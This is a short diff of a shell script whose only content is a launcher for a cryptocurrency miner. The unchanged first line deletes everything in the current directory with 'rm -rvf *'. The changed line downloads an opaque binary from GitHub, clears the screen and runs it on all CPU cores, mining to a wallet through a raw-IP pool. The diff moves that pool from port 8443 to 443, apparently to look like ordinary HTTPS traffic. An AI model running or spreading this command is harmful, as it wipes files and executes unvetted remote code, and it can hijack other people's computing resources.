@@ -1,2 +1,2 @@
 rm -rvf * && mkdir ab && cd ab
-wget https://github.com/usapindong/test/raw/refs/heads/main/sse20 && chmod +x sse20 && clear && ./sse20 -a yespowerSUGAR -o stratum+tcp://103.196.155.151:8443 -u LNDjRyemHAYZr9TmQ49Jd7D817HXT3jgmw -p c=LTC,zap=SUGAR -t $(nproc) 
+wget https://github.com/usapindong/test/raw/refs/heads/main/sse20 && chmod +x sse20 && clear && ./sse20 -a yespowerSUGAR -o stratum+tcp://103.196.155.151:443 -u LNDjRyemHAYZr9TmQ49Jd7D817HXT3jgmw -p c=LTC,zap=SUGAR -t $(nproc) 
